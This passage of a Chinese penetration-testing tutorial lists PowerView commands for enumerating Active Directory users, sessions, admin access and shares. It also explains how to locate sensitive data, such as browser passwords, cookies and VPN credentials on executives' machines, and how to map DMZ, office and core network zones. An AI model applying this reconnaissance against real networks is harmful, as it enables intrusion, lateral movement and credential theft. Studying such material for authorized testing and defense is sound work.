PowerView的下载地址：[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

首先我们要做的就是导入PowerView脚本。

命令如下：

Import-Module .\PowerView.ps1

PowerView的常用命令如下：

Get-NetDomain 获取当前用户所在域的名称  
Get-NetUser 获取所有用户的详细信息  
Get-NetDomainController 获取所有域控制器的信息  
Get-NetComputer 获取域内所有机器的详细信息  
Get-NetPrinter 获取域中所有当前计算机对象的数组  
Get-NetOU 获取域内的OU信息  
Get-NetGroup 获取所有域内组和组成员的信息  
Get-NetGroupMember 获取指定域组中所有当前用户的列表  
Get-NetFileServer 根据SPN获取当前域使用的文件服务器信息  
Get-NetShare 获取当前域内所有的网络共享信息  
Get-DFSshare 获取域上所有分发文件系统共享的列表  
Get-NetSubnet 获取域的其他网段  
Get-NetSite 获取域内的当前站点  
Get-NetDomainTrust 获取当前用户域的所有信任  
Get-NetForestTrust 获取与当前用户的域关联的林的所有信任  
Find-ForeignUser 枚举在其主域之外的组中的用户  
Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的用户  
Invoke-MapDomainTrust 尝试构建所有域信任的关系映射  
Get-NetLoggedon 获取主动登录到指定服务器的用户  
Get-NetLocalGroup 获取一个或多个远程主机上本地组的成员  
Get-NetSession 获取指定服务器的会话  
Get-NetRDPSession 获取指定服务器的远程连接  
Get-NetProcess 获取远程主机的进程  
Get-UserEvent 获取指定用户的日志  
Get-ADObject 获取活动目录的对象  
Get-NetGPO 获取域内所有的组策略对象  
Get-NetGPOGroup 获取域中设置”受限组”的所有GPO  
Find-GPOLocation 获取用户/组，并通过GPO枚举和关联使其具有有效权限的计算机  
Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限  
Get-DomainPolicy 获取域默认策略或域控制器策略  
Get-DomainSID 返回指定域的SID  
Invoke-UserHunter 获取域用户登录的计算机信息及该用户是否有本地管理员权限  
Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定用户  
Invoke-UserEventHunter 根据用户日志查询某域用户登陆过哪些域机器  
Invoke-ShareFinder 在本地域中的主机上查找（非标准）共享  
Invoke-FileFinder 在本地域中的主机上查找潜在的敏感文件  
Find-LocalAdminAccess 在域上查找当前用户具有本地管理员访问权限的计算机  
Find-ManagedSecurityGroups 搜索受管理的活动目录安全组并标识对其具有写访问权限的用户，即这些组拥有添加或删除成员的能力  
Get-ExploitableSystem 发现系统可能易受常见攻击  
Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员

##  ** **12 敏感数据防护****

内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。

###  ** **12.1 文件定位流程****

定位内部人事组织结构；  
在内部人事组织结构中寻找需要监视的人员；  
定位相关人员的机器；  
监视相关人员存放文档的位置；  
列出存放文档的服务器的目录。

###  ** **12.2 核心业务机器****

核心业务机器  
高管/系统管理员/财务/人事/业务人员的个人计算机。  
产品管理系统服务器（仓库管理系统） 。  
OA 办公系统服务器。  
财务应用系统服务器。  
核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。  
数据库服务器。  
文件服务器/共享服务器。  
邮件服务器。  
网络监控系统服务器。  
其他服务器（分公司、工厂）。

###  ** **12.3 敏感信息及文件****

站点源码备份文件、数据库备份文件等；  
各类数据库的Web管理入口，例如phpMyAdmin、Adminer；  
浏览器密码和浏览器Cookie；  
其他用户会话、3389和ipc$连接记录、回收站文件；  
无线密码；  
网络内部账号和密码，包括电子邮箱、VPN、FTP、TeamView等。

防护应用和配置文件，需要考虑：

命名空间隔离的安全、控制组资源控制的安全、内核能力机制。

##  ** **13 分析域内网段划分情况及拓扑图结构****

###  ** **13.1 基本架构****

我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。

ASP + Access + IIS 5.0/6.0 + Windows Sever 2003  
ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008  
PHP + MySQL + IIS  
PHP + MySQL + Apache  
PHP + MySQL + Ngnix  
JSP + MySQL + Ngnix  
JSP + MSSQL + Tomcat  
JSP + Oracle + Tomcat

###  ** **13.2 域内网划分****

####  ** **DMZ****

在实际的渗透测试中，大多数情况下，在外-围 Web 中拿到的权限都在 DMZ 区。这个区域不属于严格意义上的内网。如果 DMZ
区域访问控制策略配置合理，DMZ 区会处在内网能够访问 DMZ 区而 DMZ 区访问不了内网区的状态。

####  ** **办公区****

办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本
防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网
信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入
办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒
系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。

####  ** **核心区****

核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全
设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服
务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网
中横向移动时，会优先查找这些主机。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。

通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。

